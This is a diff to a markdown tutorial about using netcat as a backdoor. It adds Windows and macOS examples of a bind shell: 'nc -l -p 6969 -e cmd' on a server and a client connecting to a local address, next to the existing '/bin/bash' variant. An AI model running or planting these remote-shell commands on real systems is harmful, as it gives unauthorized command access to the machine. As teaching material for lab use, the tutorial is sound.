@@ -24,11 +24,27 @@ Earlier the **nc** command supported the **'-e'** flag which allowed the client 
 nc -l 9999 -e /bin/bash
 ```
 
+On Windows
+
+```bash
+nc -l -p 6969 -e cmd
+```
+![](../assets/img/nc-backdoor/2023-12-20-NC-Setup-Server-Windows-NC-E-sized.png)
+
 **Client**
 
 ```bash
 nc 127.0.0.1 9999 ls
 ```
+
+On macOS
+
+```bash
+nc 192.168.64.2 6969
+```
+
+![](../assets/img/nc-backdoor/2023-12-20-NC-Setup-Client-macOS-E-sized.png)
+
 Output on client will be something like:
 
 ```bash
